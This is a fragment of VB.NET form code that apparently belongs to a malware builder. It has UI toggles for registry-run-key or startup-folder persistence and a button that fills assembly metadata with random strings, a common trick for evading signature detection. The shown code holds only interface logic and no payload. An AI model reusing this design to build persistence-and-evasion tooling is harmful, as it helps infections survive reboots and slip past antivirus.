    Private Sub cb_enablestartup_CheckedChanged(sender As Object, e As EventArgs) Handles cb_enablestartup.CheckedChanged
        If cb_enablestartup.CheckState = CheckState.Checked Then
            rb_hkeylocal.Enabled = True
            rb_hkeyuser.Enabled = True
            rb_Startupfolder.Enabled = True
            cb_persistence.Enabled = True
        Else
            rb_hkeylocal.Enabled = False
            rb_hkeyuser.Enabled = False
            rb_Startupfolder.Enabled = False
            cb_persistence.Enabled = False

            rb_hkeylocal.Checked = False
            rb_hkeyuser.Checked = False
            rb_Startupfolder.Checked = False
            cb_persistence.Checked = False
        End If
    End Sub
    Private Sub btn_generate_Click(sender As Object, e As EventArgs) Handles btn_generate.Click
        tb_assemblycompany.Text = Generate()
        tb_assemblycopyright.Text = Generate()
        tb_assemblydescription.Text = Generate()
        tb_assemblyproduct.Text = Generate()
        tb_assemblytitle.Text = Generate()
        tb_assemblytrademark.Text = Generate()
    End Sub
    Function Generate() As String
        Dim pool() As String = {"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", _
                                "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", _
                                "r", "s", "t", "u", "v", "w", "x", "y", "z"}
        Dim chars As String = Nothing
        For i = 0 To 8
            chars += pool(Rnd() * 61)
        Next
        Return chars
    End Function
#End Region
#Region "News"
    Dim ID As Integer
    Dim retrieve As Thread
    Delegate Sub DelegateWriteOutput(ByVal rtb As RichTextBox, text As String)
    Sub writeoutput(ByVal rtb As RichTextBox, text As String)
        rtb.Text += text & vbCrLf
    End Sub
#End Region

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

    End Sub
End Class